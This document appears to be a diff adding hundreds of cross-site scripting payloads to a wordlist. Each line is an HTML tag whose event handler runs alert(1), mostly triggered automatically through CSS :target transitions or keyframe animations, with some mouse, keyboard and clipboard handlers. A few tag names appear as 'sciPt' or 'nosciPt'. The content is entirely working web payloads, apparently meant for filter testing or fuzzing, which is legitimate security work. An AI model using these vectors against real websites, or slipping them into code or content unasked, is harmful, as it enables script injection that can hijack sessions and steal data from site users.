+<strike onmouseout=\"alert(1)\">test</strike>
+<strong draggable=\"true\" ondragend=\"alert(1)\">test</strong>
+<strong onbeforecopy=\"alert(1)\" contenteditable>test</strong>
+<strong onkeyup=\"alert(1)\" contenteditable>test</strong>
+<strong onmouseenter=\"alert(1)\">test</strong>
+<strong onmouseleave=\"alert(1)\">test</strong>
+<strong onmousemove=\"alert(1)\">test</strong>
+<strong onmouseout=\"alert(1)\">test</strong>
+<strong onpaste=\"alert(1)\" contenteditable>test</strong>
+<style onclick=\"alert(1)\">test</style>
+<style oncontextmenu=\"alert(1)\">test</style>
+<style oncopy=\"alert(1)\" contenteditable>test</style>
+<style oncut=\"alert(1)\" contenteditable>test</style>
+<style ondblclick=\"alert(1)\">test</style>
+<style onfocusout=alert(1) tabindex=1 id=x></style><input autofocus>
+<style onkeydown=\"alert(1)\" contenteditable>test</style>
+<style onkeypress=\"alert(1)\" contenteditable>test</style>
+<style onkeyup=\"alert(1)\" contenteditable>test</style>
+<style onload=alert(1)></style>
+<style onmousedown=\"alert(1)\">test</style>
+<style onmouseenter=\"alert(1)\">test</style>
+<style onmouseleave=\"alert(1)\">test</style>
+<style onmousemove=\"alert(1)\">test</style>
+<style onmouseout=\"alert(1)\">test</style>
+<style onmouseover=\"alert(1)\">test</style>
+<style onmouseup=\"alert(1)\">test</style>
+<style onreadystatechange=alert(1)></style>
+<style>:target {color: red;}</style><a id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></a>
+<style>:target {color: red;}</style><abbr id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></abbr>
+<style>:target {color: red;}</style><bdo id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></bdo>
+<style>:target {color: red;}</style><blink id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></blink>
+<style>:target {color: red;}</style><blockquote id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></blockquote>
+<style>:target {color: red;}</style><colgroup id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></colgroup>
+<style>:target {color: red;}</style><data id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></data>
+<style>:target {color: red;}</style><dl id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></dl>
+<style>:target {color: red;}</style><form id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></form>
+<style>:target {color: red;}</style><html id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></html>
+<style>:target {color: red;}</style><nav id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></nav>
+<style>:target {color: red;}</style><nextid id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></nextid>
+<style>:target {color: red;}</style><nobr id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></nobr>
+<style>:target {color: red;}</style><noembed id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></noembed>
+<style>:target {color: red;}</style><noframes id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></noframes>
+<style>:target {color: red;}</style><option id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></option>
+<style>:target {color: red;}</style><param id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></param>
+<style>:target {color: red;}</style><plaintext id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></plaintext>
+<style>:target {color: red;}</style><pre id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></pre>
+<style>:target {color: red;}</style><ruby id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></ruby>
+<style>:target {color: red;}</style><s id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></s>
+<style>:target {color: red;}</style><samp id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></samp>
+<style>:target {color: red;}</style><sciPt id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></sciPt>
+<style>:target {color: red;}</style><section id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></section>
+<style>:target {color: red;}</style><select id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></select>
+<style>:target {color: red;}</style><shadow id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></shadow>
+<style>:target {color: red;}</style><slot id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></slot>
+<style>:target {color: red;}</style><small id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></small>
+<style>:target {color: red;}</style><source id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></source>
+<style>:target {color: red;}</style><spacer id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></spacer>
+<style>:target {color: red;}</style><span id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></span>
+<style>:target {color: red;}</style><strike id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></strike>
+<style>:target {color: red;}</style><strong id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></strong>
+<style>:target {color: red;}</style><style id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></style>
+<style>:target {color: red;}</style><sub id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></sub>
+<style>:target {color: red;}</style><summary id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></summary>
+<style>:target {color: red;}</style><svg id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></svg>
+<style>:target {color: red;}</style><table id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></table>
+<style>:target {color: red;}</style><tbody id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></tbody>
+<style>:target {color: red;}</style><textarea id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></textarea>
+<style>:target {color: red;}</style><tt id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></tt>
+<style>:target {color: red;}</style><wbr id=x style=\"transition:color 10s\" ontransitioncancel=alert(1)></wbr>
+<style>:target {color:red;}</style><abbr id=x style=\"transition:color 1s\" ontransitionend=alert(1)></abbr>
+<style>:target {color:red;}</style><b id=x style=\"transition:color 1s\" ontransitionend=alert(1)></b>
+<style>:target {color:red;}</style><button id=x style=\"transition:color 1s\" ontransitionend=alert(1)></button>
+<style>:target {color:red;}</style><content id=x style=\"transition:color 1s\" ontransitionend=alert(1)></content>
+<style>:target {color:red;}</style><dfn id=x style=\"transition:color 1s\" ontransitionend=alert(1)></dfn>
+<style>:target {color:red;}</style><iframe id=x style=\"transition:color 1s\" ontransitionend=alert(1)></iframe>
+<style>:target {color:red;}</style><ins id=x style=\"transition:color 1s\" ontransitionend=alert(1)></ins>
+<style>:target {color:red;}</style><isindex id=x style=\"transition:color 1s\" ontransitionend=alert(1)></isindex>
+<style>:target {color:red;}</style><link id=x style=\"transition:color 1s\" ontransitionend=alert(1)></link>
+<style>:target {color:red;}</style><main id=x style=\"transition:color 1s\" ontransitionend=alert(1)></main>
+<style>:target {color:red;}</style><marquee id=x style=\"transition:color 1s\" ontransitionend=alert(1)></marquee>
+<style>:target {color:red;}</style><menu id=x style=\"transition:color 1s\" ontransitionend=alert(1)></menu>
+<style>:target {color:red;}</style><menuitem id=x style=\"transition:color 1s\" ontransitionend=alert(1)></menuitem>
+<style>:target {color:red;}</style><meter id=x style=\"transition:color 1s\" ontransitionend=alert(1)></meter>
+<style>:target {color:red;}</style><multicol id=x style=\"transition:color 1s\" ontransitionend=alert(1)></multicol>
+<style>:target {color:red;}</style><nav id=x style=\"transition:color 1s\" ontransitionend=alert(1)></nav>
+<style>:target {color:red;}</style><nobr id=x style=\"transition:color 1s\" ontransitionend=alert(1)></nobr>
+<style>:target {color:red;}</style><noembed id=x style=\"transition:color 1s\" ontransitionend=alert(1)></noembed>
+<style>:target {color:red;}</style><noframes id=x style=\"transition:color 1s\" ontransitionend=alert(1)></noframes>
+<style>:target {color:red;}</style><nosciPt id=x style=\"transition:color 1s\" ontransitionend=alert(1)></nosciPt>
+<style>:target {color:red;}</style><object id=x style=\"transition:color 1s\" ontransitionend=alert(1)></object>
+<style>:target {color:red;}</style><ol id=x style=\"transition:color 1s\" ontransitionend=alert(1)></ol>
+<style>:target {color:red;}</style><optgroup id=x style=\"transition:color 1s\" ontransitionend=alert(1)></optgroup>
+<style>:target {color:red;}</style><option id=x style=\"transition:color 1s\" ontransitionend=alert(1)></option>
+<style>:target {color:red;}</style><output id=x style=\"transition:color 1s\" ontransitionend=alert(1)></output>
+<style>:target {color:red;}</style><p id=x style=\"transition:color 1s\" ontransitionend=alert(1)></p>
+<style>:target {color:red;}</style><param id=x style=\"transition:color 1s\" ontransitionend=alert(1)></param>
+<style>:target {color:red;}</style><picture id=x style=\"transition:color 1s\" ontransitionend=alert(1)></picture>
+<style>:target {color:red;}</style><plaintext id=x style=\"transition:color 1s\" ontransitionend=alert(1)></plaintext>
+<style>:target {color:red;}</style><pre id=x style=\"transition:color 1s\" ontransitionend=alert(1)></pre>
+<style>:target {color:red;}</style><progress id=x style=\"transition:color 1s\" ontransitionend=alert(1)></progress>
+<style>:target {color:red;}</style><q id=x style=\"transition:color 1s\" ontransitionend=alert(1)></q>
+<style>:target {color:red;}</style><rb id=x style=\"transition:color 1s\" ontransitionend=alert(1)></rb>
+<style>:target {color:red;}</style><rp id=x style=\"transition:color 1s\" ontransitionend=alert(1)></rp>
+<style>:target {color:red;}</style><rt id=x style=\"transition:color 1s\" ontransitionend=alert(1)></rt>
+<style>:target {color:red;}</style><rtc id=x style=\"transition:color 1s\" ontransitionend=alert(1)></rtc>
+<style>:target {color:red;}</style><ruby id=x style=\"transition:color 1s\" ontransitionend=alert(1)></ruby>
+<style>:target {color:red;}</style><small id=x style=\"transition:color 1s\" ontransitionend=alert(1)></small>
+<style>:target {color:red;}</style><sup id=x style=\"transition:color 1s\" ontransitionend=alert(1)></sup>
+<style>:target {color:red;}</style><tfoot id=x style=\"transition:color 1s\" ontransitionend=alert(1)></tfoot>
+<style>:target {color:red;}</style><track id=x style=\"transition:color 1s\" ontransitionend=alert(1)></track>
+<style>:target {transform: rotate(180deg);}</style><a id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></a>
+<style>:target {transform: rotate(180deg);}</style><bdi id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></bdi>
+<style>:target {transform: rotate(180deg);}</style><bgsound id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></bgsound>
+<style>:target {transform: rotate(180deg);}</style><col id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></col>
+<style>:target {transform: rotate(180deg);}</style><content id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></content>
+<style>:target {transform: rotate(180deg);}</style><del id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></del>
+<style>:target {transform: rotate(180deg);}</style><em id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></em>
+<style>:target {transform: rotate(180deg);}</style><embed id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></embed>
+<style>:target {transform: rotate(180deg);}</style><fieldset id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></fieldset>
+<style>:target {transform: rotate(180deg);}</style><figure id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></figure>
+<style>:target {transform: rotate(180deg);}</style><font id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></font>
+<style>:target {transform: rotate(180deg);}</style><hr id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></hr>
+<style>:target {transform: rotate(180deg);}</style><image id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></image>
+<style>:target {transform: rotate(180deg);}</style><ins id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></ins>
+<style>:target {transform: rotate(180deg);}</style><isindex id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></isindex>
+<style>:target {transform: rotate(180deg);}</style><main id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></main>
+<style>:target {transform: rotate(180deg);}</style><nav id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></nav>
+<style>:target {transform: rotate(180deg);}</style><nosciPt id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></nosciPt>
+<style>:target {transform: rotate(180deg);}</style><object id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></object>
+<style>:target {transform: rotate(180deg);}</style><ol id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></ol>
+<style>:target {transform: rotate(180deg);}</style><picture id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></picture>
+<style>:target {transform: rotate(180deg);}</style><section id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></section>
+<style>:target {transform: rotate(180deg);}</style><select id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></select>
+<style>:target {transform: rotate(180deg);}</style><shadow id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></shadow>
+<style>:target {transform: rotate(180deg);}</style><slot id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></slot>
+<style>:target {transform: rotate(180deg);}</style><small id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></small>
+<style>:target {transform: rotate(180deg);}</style><source id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></source>
+<style>:target {transform: rotate(180deg);}</style><spacer id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></spacer>
+<style>:target {transform: rotate(180deg);}</style><span id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></span>
+<style>:target {transform: rotate(180deg);}</style><strike id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></strike>
+<style>:target {transform: rotate(180deg);}</style><strong id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></strong>
+<style>:target {transform: rotate(180deg);}</style><style id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></style>
+<style>:target {transform: rotate(180deg);}</style><sub id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></sub>
+<style>:target {transform: rotate(180deg);}</style><summary id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></summary>
+<style>:target {transform: rotate(180deg);}</style><sup id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></sup>
+<style>:target {transform: rotate(180deg);}</style><tbody id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></tbody>
+<style>:target {transform: rotate(180deg);}</style><td id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></td>
+<style>:target {transform: rotate(180deg);}</style><template id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></template>
+<style>:target {transform: rotate(180deg);}</style><textarea id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></textarea>
+<style>:target {transform: rotate(180deg);}</style><tfoot id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></tfoot>
+<style>:target {transform: rotate(180deg);}</style><th id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></th>
+<style>:target {transform: rotate(180deg);}</style><thead id=x style=\"transition:transform 2s\" ontransitionrun=alert(1)></thead>
+<style>@keyframes slidein {}</style><a style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></a>
+<style>@keyframes slidein {}</style><article style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></article>
+<style>@keyframes slidein {}</style><bdi style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></bdi>
+<style>@keyframes slidein {}</style><canvas style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></canvas>
+<style>@keyframes slidein {}</style><colgroup style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></colgroup>
+<style>@keyframes slidein {}</style><dialog style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></dialog>
+<style>@keyframes slidein {}</style><figure style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></figure>
+<style>@keyframes slidein {}</style><h1 style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></h1>
+<style>@keyframes slidein {}</style><img style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></img>
+<style>@keyframes slidein {}</style><input style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></input>
+<style>@keyframes slidein {}</style><ins style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></ins>
+<style>@keyframes slidein {}</style><isindex style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></isindex>
+<style>@keyframes slidein {}</style><kbd style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></kbd>
+<style>@keyframes slidein {}</style><keygen style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></keygen>
+<style>@keyframes slidein {}</style><label style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></label>
+<style>@keyframes slidein {}</style><link style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></link>
+<style>@keyframes slidein {}</style><object style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></object>
+<style>@keyframes slidein {}</style><ol style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></ol>
+<style>@keyframes slidein {}</style><optgroup style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></optgroup>
+<style>@keyframes slidein {}</style><option style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></option>
+<style>@keyframes slidein {}</style><output style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></output>
+<style>@keyframes slidein {}</style><p style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></p>
+<style>@keyframes slidein {}</style><param style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></param>
+<style>@keyframes slidein {}</style><picture style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></picture>
+<style>@keyframes slidein {}</style><plaintext style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></plaintext>
+<style>@keyframes slidein {}</style><pre style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></pre>
+<style>@keyframes slidein {}</style><progress style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></progress>
+<style>@keyframes slidein {}</style><q style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></q>
+<style>@keyframes slidein {}</style><rb style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></rb>
+<style>@keyframes slidein {}</style><rp style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></rp>
+<style>@keyframes slidein {}</style><rt style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></rt>
+<style>@keyframes slidein {}</style><rtc style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></rtc>
+<style>@keyframes slidein {}</style><ruby style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></ruby>
+<style>@keyframes slidein {}</style><samp style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></samp>
+<style>@keyframes slidein {}</style><sciPt style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></sciPt>
+<style>@keyframes slidein {}</style><section style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></section>
+<style>@keyframes slidein {}</style><sub style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></sub>
+<style>@keyframes slidein {}</style><sup style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></sup>
+<style>@keyframes slidein {}</style><svg style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></svg>
+<style>@keyframes slidein {}</style><var style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></var>
+<style>@keyframes slidein {}</style><wbr style=\"animation-duration:1s;animation-name:slidein;animation-iteration-count:2\" onanimationiteration=\"alert(1)\"></wbr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><audio id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></audio>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><bgsound id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></bgsound>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><caption id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></caption>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><dd id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></dd>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><em id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></em>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><figure id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></figure>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><form id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></form>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><frame id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></frame>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><header id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></header>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><i id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></i>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><image id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></image>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ins id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></ins>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><keygen id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></keygen>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><label id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></label>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><legend id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></legend>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></li>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><link id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></link>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><listing id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></listing>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><main id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></main>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><map id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></map>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><mark id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></mark>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><marquee id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></marquee>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menu id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></menu>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><menuitem id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></menuitem>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meta id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></meta>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><meter id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></meter>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><multicol id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></multicol>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nav id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></nav>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nextid id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></nextid>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nobr id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></nobr>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><noframes id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></noframes>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><nosciPt id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></nosciPt>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><object id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></object>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><ol id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></ol>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><option id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></option>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><param id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></param>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><shadow id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></shadow>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><table id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></table>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><th id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></th>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><thead id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></thead>
+<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><u id=x style=\"position:absolute;\" onanimationcancel=\"alert(1)\"></u>
+<style>@keyframes x{}</style><acronym style=\"animation-name:x\" onanimationend=\"alert(1)\"></acronym>
+<style>@keyframes x{}</style><article style=\"animation-name:x\" onanimationstart=\"alert(1)\"></article>
+<style>@keyframes x{}</style><bdi style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bdi>
+<style>@keyframes x{}</style><bdo style=\"animation-name:x\" onanimationend=\"alert(1)\"></bdo>
+<style>@keyframes x{}</style><bdo style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bdo>
+<style>@keyframes x{}</style><bgsound style=\"animation-name:x\" onanimationend=\"alert(1)\"></bgsound>
+<style>@keyframes x{}</style><bgsound style=\"animation-name:x\" onanimationstart=\"alert(1)\"></bgsound>
+<style>@keyframes x{}</style><big style=\"animation-name:x\" onanimationend=\"alert(1)\"></big>
+<style>@keyframes x{}</style><big style=\"animation-name:x\" onanimationstart=\"alert(1)\"></big>
+<style>@keyframes x{}</style><blink style=\"animation-name:x\" onanimationend=\"alert(1)\"></blink>
+<style>@keyframes x{}</style><blink style=\"animation-name:x\" onanimationstart=\"alert(1)\"></blink>
+<style>@keyframes x{}</style><blockquote style=\"animation-name:x\" onanimationend=\"alert(1)\"></blockquote>
